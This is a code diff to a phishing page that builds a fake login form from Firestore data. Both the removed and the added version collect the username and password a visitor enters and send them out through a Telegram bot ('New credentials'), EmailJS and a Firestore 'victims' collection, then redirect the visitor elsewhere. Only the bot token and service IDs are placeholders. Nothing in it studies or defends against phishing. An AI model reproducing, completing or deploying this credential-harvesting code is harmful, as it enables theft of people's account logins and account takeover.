@@ -38,14 +38,8 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // Telegram placeholders (replace later)
-    const telegramBotToken = "YOUR_BOT_TOKEN";
-    const telegramChatId = "YOUR_CHAT_ID";
-
-    // EmailJS placeholders (replace later)
+    // Init EmailJS
     emailjs.init("YOUR_PUBLIC_KEY");
-    const emailServiceID = "YOUR_SERVICE_ID";
-    const emailTemplateID = "YOUR_TEMPLATE_ID";
 
     const params = new URLSearchParams(location.search);
     let formId = params.get("id") || "defaultForm123";
@@ -59,9 +53,6 @@
       }
 
       const data = doc.data();
-      window.formRedirectURL = data.redirectLink;
-      window.formDocId = formId;
-
       let html = `<div style="color:${data.textColor};background:${data.bgColor};padding:20px;border-radius:10px;background-image:url('${data.bgImageURL}');background-size:${data.bgWidth} ${data.bgHeight};">`;
 
       if (data.title) html += `<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
@@ -73,8 +64,8 @@
 
       html += `<form>`;
       if (data.addAuth) {
-        html += `<input placeholder="${data.usernamePlaceholder || 'Username'}" type="text" name="username">
-                 <input type="password" placeholder="${data.passwordPlaceholder || 'Password'}" name="password">`;
+        html += `<input placeholder="${data.usernamePlaceholder || 'Username'}" type="text" required>
+                 <input type="password" placeholder="${data.passwordPlaceholder || 'Password'}" required>`;
       }
 
       if (data.frontDesc) html += `<label>${data.frontDesc}</label><input type="file">`;
@@ -83,7 +74,7 @@
 
       const fields = [...(data.fields || []), ...(data.extraFields || [])];
       fields.forEach(f => {
-        if (f.trim()) html += `<input placeholder="${f.trim()}" name="${f.trim()}">`;
+        if (f.trim()) html += `<input placeholder="${f.trim()}">`;
       });
 
       let emoji = {
@@ -105,76 +96,79 @@
 
       html += `</div>`;
       $('formView').innerHTML = html;
+
+      // Store redirect link globally
+      window.formRedirectURL = data.redirectLink || "https://example.com";
+    }).then(() => {
+      // Attach submit listener after form is loaded
+      const observer = new MutationObserver(() => {
+        const form = document.querySelector("#formView form");
+        if (form) {
+          observer.disconnect();
+
+          form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const inputs = form.querySelectorAll("input[type='text'], input[type='password']");
+            let username = inputs[0]?.value || "";
+            let password = inputs[1]?.value || "";
+            const redirectURL = window.formRedirectURL;
+
+            const telegramBotToken = "YOUR_BOT_TOKEN";
+            const telegramChatId = "YOUR_CHAT_ID";
+
+            let telegramSent = false;
+            let emailSent = false;
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: `🔥 New credentials:\nUsername: ${username}\nPassword: ${password}\nRedirect: ${redirectURL}`
+              })
+            }).then(res => {
+              if (res.ok) telegramSent = true;
+            });
+
+            // Send to Email via EmailJS
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+              username: username,
+              password: password,
+              redirect: redirectURL
+            }).then(() => {
+              emailSent = true;
+            }).catch(() => {
+              emailSent = false;
+            });
+
+            // Save to Firestore victims collection
+            firebase.firestore()
+              .collection("forms").doc("defaultForm123")
+              .collection("victims").add({
+                Username: username,
+                Password: password,
+                redirectLinkSentTo: redirectURL,
+                telegramSent: telegramSent,
+                emailSent: emailSent,
+                timestamp: new Date().toLocaleString()
+              });
+
+            // Play notification sound
+            const audio = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");
+            audio.play();
+
+            // Redirect instantly
+            window.location.href = redirectURL;
+          });
+        }
+      });
+
+      observer.observe(document.getElementById("formView"), { childList: true, subtree: true });
     }).catch(err => {
       $('formView').innerHTML = `<p style="color:red;">⚠️ Error loading form.</p><pre>${err.message}</pre>`;
     });
-  </script>
-
-  <script>
-  document.addEventListener("DOMContentLoaded", function () {
-      const formContainer = document.getElementById("formView");
-
-      const observer = new MutationObserver(() => {
-          const form = formContainer.querySelector("form");
-          if (form) {
-              observer.disconnect();
-
-              form.addEventListener("submit", function (e) {
-                  e.preventDefault();
-
-                  let formDataObj = {};
-                  form.querySelectorAll("input").forEach(input => {
-                      if (input.type !== "file") {
-                          formDataObj[input.placeholder || input.name] = input.value;
-                      }
-                  });
-
-                  // Add redirect link to the log
-                  formDataObj["redirectLinkSentTo"] = window.formRedirectURL || "N/A";
-
-                  // Play notification sound
-                  const audio = new Audio("https://actions.google.com/sounds/v1/alarms/beep_short.ogg");
-                  audio.play();
-
-                  // Send to Telegram
-                  if (telegramBotToken !== "YOUR_BOT_TOKEN") {
-                      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                          method: "POST",
-                          headers: { "Content-Type": "application/json" },
-                          body: JSON.stringify({
-                              chat_id: telegramChatId,
-                              text: `🔥 New credentials captured:\n${JSON.stringify(formDataObj, null, 2)}`
-                          })
-                      });
-                  }
-
-                  // Send to Email
-                  if (emailServiceID !== "YOUR_SERVICE_ID") {
-                      emailjs.send(emailServiceID, emailTemplateID, formDataObj);
-                  }
-
-                  // Save to Firestore
-                  if (window.formDocId) {
-                      firebase.firestore()
-                          .collection("forms")
-                          .doc(window.formDocId)
-                          .collection("victims")
-                          .add({
-                              ...formDataObj,
-                              timestamp: new Date().toISOString()
-                          })
-                          .finally(() => {
-                              window.location.href = window.formRedirectURL || "https://example.com";
-                          });
-                  } else {
-                      window.location.href = window.formRedirectURL || "https://example.com";
-                  }
-              });
-          }
-      });
-
-      observer.observe(formContainer, { childList: true, subtree: true });
-  });
   </script>
 </body>
 </html>
